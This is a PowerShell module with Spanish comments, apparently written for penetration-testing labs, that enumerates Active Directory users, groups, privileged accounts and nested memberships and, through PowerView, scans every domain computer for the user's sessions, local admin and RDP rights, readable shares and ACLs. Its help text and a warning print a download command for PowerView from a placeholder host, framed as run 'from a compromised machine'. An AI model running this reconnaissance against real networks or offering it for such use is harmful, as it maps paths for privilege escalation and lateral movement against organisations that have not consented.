# ADEnum-Extended.psm1
# Módulo para enumeración avanzada de Active Directory
# Autor: duckman_42 + ChatGPT Fusion Power

# ====================[ Variables Globales ]====================
$script:criticalUsers = @("Administrator", "krbtgt")
$script:criticalGroups = @("Domain Admins", "Enterprise Admins", "Administrators")

# ====================[ Función de Ayuda ]====================
function Show-ADHelp {
    @"
ADEnum-Extended.psm1 - Módulo de enumeración AD

Funciones disponibles:
  Enum-ADUsers             - Enumera usuarios con detalles y membresías.
  Enum-ADGroups            - Enumera grupos y miembros.
  Enum-ADCritical          - Enumera usuarios y grupos críticos resaltados.
  Enum-ADRelationships     - Relación de usuarios a grupos y viceversa.
  Get-GroupUserChain       - Muestra recursivamente miembros anidados de un grupo.
  Get-UserAccessInsight    - Requiere PowerView. Analiza privilegios del usuario.
  Show-ADHelp              - Muestra esta ayuda.

Sugerencias:
  - Para importar el módulo: Import-Module .\ADEnum-Extended.psm1
  - Para obtener PowerView si no está disponible:
      iwr -uri "http://example.com/PowerView.ps1" -OutFile "PowerView.ps1"

"@ | Write-Host -ForegroundColor Cyan
}

# ====================[ Función Base LDAP ]====================
function Invoke-LDAPQuery {
    param (
        [Parameter(Mandatory = $true)]
        [string]$LDAPFilter,

        [string[]]$PropertiesToLoad = @("samaccountname", "name", "memberof", "member"),

        [switch]$ExpandRelationships,
        [switch]$HighlightCritical
    )

    try {
        $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
        $DN = ([ADSI]'').distinguishedName
        $LDAP = "LDAP://$PDC/$DN"

        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry)
        $Searcher.Filter = $LDAPFilter
        $Searcher.PageSize = 1000

        foreach ($prop in $PropertiesToLoad) {
            $Searcher.PropertiesToLoad.Add($prop) | Out-Null
        }

        $Results = $Searcher.FindAll()

        foreach ($entry in $Results) {
            $props = $entry.Properties
            $name = $props["name"] -join ", "
            $sam = $props["samaccountname"] -join ", "
            $memberof = @()
            $members = @()

            if ($ExpandRelationships -and $props["memberof"]) {
                foreach ($dn in $props["memberof"]) {
                    try {
                        $groupCN = ([ADSI]"LDAP://$dn").cn
                        $memberof += $groupCN
                    } catch {
                        $memberof += $dn
                    }
                }
            }

            if ($ExpandRelationships -and $props["member"]) {
                foreach ($dn in $props["member"]) {
                    try {
                        $userCN = ([ADSI]"LDAP://$dn").samaccountname
                        $members += $userCN
                    } catch {
                        $members += $dn
                    }
                }
            }

            $isCriticalUser = $HighlightCritical -and ($script:criticalUsers -contains $sam)
            $isCriticalGroup = $HighlightCritical -and ($script:criticalGroups -contains $name)

            if ($isCriticalUser -or $isCriticalGroup) {
                Write-Host "`n[$sam] ($name)" -ForegroundColor Red
            } else {
                Write-Host "`n[$sam] ($name)" -ForegroundColor Cyan
            }

            if ($memberof.Count -gt 0) {
                Write-Host "  ➤ Miembro de: $($memberof -join ', ')" -ForegroundColor Yellow
            }

            if ($members.Count -gt 0) {
                Write-Host "  ➤ Miembros del grupo: $($members -join ', ')" -ForegroundColor Green
            }
        }
    } catch {
        Write-Warning "Error realizando la búsqueda LDAP: $_"
    }
}

# ====================[ Funciones Públicas Básicas ]====================
function Enum-ADUsers {
    param (
        [switch]$ExpandGroups,
        [switch]$HighlightCritical
    )
    Invoke-LDAPQuery -LDAPFilter "(&(objectCategory=person)(objectClass=user))" -ExpandRelationships:$ExpandGroups -HighlightCritical:$HighlightCritical
}

function Enum-ADGroups {
    param (
        [switch]$ExpandUsers,
        [switch]$HighlightCritical
    )
    Invoke-LDAPQuery -LDAPFilter "(objectClass=group)" -ExpandRelationships:$ExpandUsers -HighlightCritical:$HighlightCritical
}

function Enum-ADCritical {
    Enum-ADUsers -ExpandGroups -HighlightCritical
    Enum-ADGroups -ExpandUsers -HighlightCritical
}

function Enum-ADRelationships {
    Write-Host "`nRelaciones Usuario → Grupos:`n" -ForegroundColor Magenta
    Invoke-LDAPQuery -LDAPFilter "(&(objectCategory=person)(objectClass=user))" -ExpandRelationships

    Write-Host "`nRelaciones Grupo → Miembros:`n" -ForegroundColor Magenta
    Invoke-LDAPQuery -LDAPFilter "(objectClass=group)" -ExpandRelationships
}

# ====================[ Función de Grupos Anidados ]====================
function Get-GroupUserChain {
    param (
        [string]$GroupName,
        [int]$Depth = 0
    )

    $indent = ('  ' * $Depth) + '↳ '
    $group = [ADSI]"LDAP://CN=$GroupName,CN=Users,DC=corp,DC=com"
    if (-not $group) { return }

    $members = $group.member
    if (-not $members) {
        Write-Host "$indent $GroupName (sin miembros)" -ForegroundColor Yellow
        return
    }

    Write-Host "$indent $GroupName" -ForegroundColor Cyan

    foreach ($memberDN in $members) {
        $member = [ADSI]"LDAP://$memberDN"
        $objectClass = $member.objectClass

        if ($objectClass -contains "group") {
            $memberCN = $member.cn
            Get-GroupUserChain -GroupName $memberCN -Depth ($Depth + 1)
        }
        elseif ($objectClass -contains "user") {
            Write-Host ('  ' * ($Depth + 1)) + "↳ $($member.cn)" -ForegroundColor Green
        }
    }
}

# ====================[ Función Extendida con PowerView ]====================
function Get-UserAccessInsight {
    param (
        [Parameter(Mandatory = $true)]
        [string]$UserName
    )

    if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
        Write-Warning "[!] PowerView no detectado. Descárgalo desde una máquina comprometida con:"
        Write-Host "iwr -uri http://example.com/PowerView.ps1 -OutFile PowerView.ps1" -ForegroundColor Cyan
        return
    }

    Import-Module .\PowerView.ps1 -ErrorAction SilentlyContinue

    Write-Host "[*] Analizando privilegios del usuario $UserName..." -ForegroundColor Cyan
    $computers = Get-DomainComputer | Select-Object -ExpandProperty Name
    $results = @()

    foreach ($computer in $computers) {
        $info = @{
            Computer = $computer
            HasSession = $false
            IsAdmin = $false
            IsRDPUser = $false
            Shares = ""
            ACLPermissions = ""
        }

        try {
            $sessions = Get-NetSession -ComputerName $computer -ErrorAction Stop
            if ($sessions | Where-Object { $_.UserName -like "*$UserName*" }) {
                $info.HasSession = $true
            }
        } catch {}

        try {
            $admins = Get-NetLocalGroup -ComputerName $computer -GroupName "Administrators"
            if ($admins | Where-Object { $_.MemberName -like "*$UserName*" }) {
                $info.IsAdmin = $true
            }
        } catch {}

        try {
            $rdp = Get-NetLocalGroup -ComputerName $computer -GroupName "Remote Desktop Users"
            if ($rdp | Where-Object { $_.MemberName -like "*$UserName*" }) {
                $info.IsRDPUser = $true
            }
        } catch {}

        try {
            $shares = Invoke-ShareFinder -ComputerName $computer -CheckShareAccess
            if ($shares) {
                $info.Shares = ($shares | Where-Object { $_.Accessible -eq $true } | Select-Object -ExpandProperty Name) -join ", "
            }
        } catch {}

        try {
            $acls = Invoke-ACLScanner -ResolveGUIDs -ComputerName $computer
            $userACLs = $acls | Where-Object { $_.IdentityReference -like "*$UserName*" }
            $info.ACLPermissions = ($userACLs | Select-Object -ExpandProperty FileSystemRights) -join ", "
        } catch {}

        $results += New-Object PSObject -Property $info
    }

    $results | Format-Table -AutoSize
}

# ====================[ Mensaje de carga ]====================
Write-Host "`n[+] Módulo ADEnum-Extended.psm1 importado correctamente. Usa Show-ADHelp para ver opciones." -ForegroundColor Green
